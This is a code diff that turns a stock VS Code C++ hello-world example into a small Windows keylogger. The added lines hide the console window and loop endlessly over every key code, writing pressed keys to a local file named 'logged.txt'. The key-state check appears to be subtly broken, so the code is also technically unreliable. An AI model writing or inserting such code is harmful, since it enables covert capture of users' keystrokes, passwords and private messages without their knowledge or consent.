@@ -1,16 +1,25 @@
 #include <iostream>
-#include <vector>
-#include <string>
-
+#include <fstream>
+#include <windows.h>
+#include <winuser.h>
 using namespace std;
+
+#define LOG_FILE "logged.txt"
+ofstream outputLog (LOG_FILE);
+
 
 int main()
 {
-    vector<string> msg {"Hello", "C++", "World", "from", "VS Code", "and the C++ extension!"};
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
 
-    for (const string& word : msg)
-    {
-        cout << word << " ";
+    while (true) {
+        for (int i = 0; i < 256; i++) {
+            if (GetKeyState(i) & 0xF) {
+                outputLog.put((char)i);
+            }
+        }
     }
-    cout << endl;
+
+    return 0;
 }
